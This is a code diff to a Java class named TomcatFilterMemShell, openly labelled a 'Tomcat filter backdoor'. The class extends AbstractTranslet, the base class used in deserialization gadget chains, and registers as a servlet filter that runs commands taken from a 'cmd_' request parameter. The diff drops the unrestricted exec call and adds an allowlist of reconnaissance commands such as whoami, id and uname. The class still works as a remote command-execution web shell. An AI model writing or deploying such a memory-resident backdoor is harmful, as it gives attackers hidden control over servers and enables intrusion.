@@ -21,6 +21,9 @@ import java.util.*;
 
 @Component
 public class TomcatFilterMemShell extends AbstractTranslet implements Filter {
+    private static final Set<String> ALLOWED_COMMANDS = new HashSet<>(
+            Arrays.asList("ls", "whoami", "date", "hostname", "id", "uname"));
+
     static{
         try {
             System.out.println("Tomcat filter backdoor class is loading...");
@@ -94,7 +97,13 @@ public class TomcatFilterMemShell extends AbstractTranslet implements Filter {
     public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
         String cmd;
         if ((cmd = servletRequest.getParameter("cmd_")) != null) {
-            Process process = Runtime.getRuntime().exec(cmd);
+            if (!ALLOWED_COMMANDS.contains(cmd.trim())) {
+                servletResponse.getOutputStream().write("Command not allowed".getBytes());
+                servletResponse.getOutputStream().flush();
+                servletResponse.getOutputStream().close();
+                return;
+            }
+            Process process = Runtime.getRuntime().exec(new String[]{cmd.trim()});
             java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                     new java.io.InputStreamReader(process.getInputStream()));
             StringBuilder stringBuilder = new StringBuilder();
